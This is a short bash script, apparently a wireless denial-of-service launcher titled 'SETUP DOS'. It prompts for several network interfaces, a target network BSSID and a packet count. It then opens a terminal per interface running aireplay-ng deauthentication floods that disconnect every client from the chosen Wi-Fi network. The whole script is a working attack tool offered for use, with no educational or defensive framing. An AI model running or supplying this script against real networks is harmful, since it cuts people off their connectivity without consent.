#!/bin/bash


logo() {
	clear
	echo -e "=========================================================================="
	echo -e "                               SETUP DOS           "
	echo -e "=========================================================================="
	echo -e "\033[01;31m==========================================================================\033[00m"
}

clear
logo

function dos() {
    declare -A INTERFACES
    echo -ne "\n\033[00;33mHow many interfaces do you want to use?: \033[00;37m";read QNT_INFACES
    for (( qnt=1; qnt<=$QNT_INFACES; qnt++ ));do
        
        while [ -z ${INTERFACES[$qnt]} ];do
            echo -ne "\033[00;33mEnter the name of the interface $qnt: \033[00;37m";read INTERFACES[$qnt]
        done
    done
    echo -ne "\033[00;33mEnter the BSSID of the network: \033[00;37m";read bssid
    echo -ne "\033[00;33mEnter the number of packets to send: \033[00;37m";read PACOTES

    sleep 2
    clear
    
    for IFC in ${INTERFACES[@]};do
        gnome-terminal --geometry=60x20 --hide-menubar --window -x bash -c "aireplay-ng --deauth $PACOTES -a $bssid $IFC --ignore-negative-one" &>/dev/null && flag=0 && flag=1
        clear
    done
}

dos
source lib/dos.sh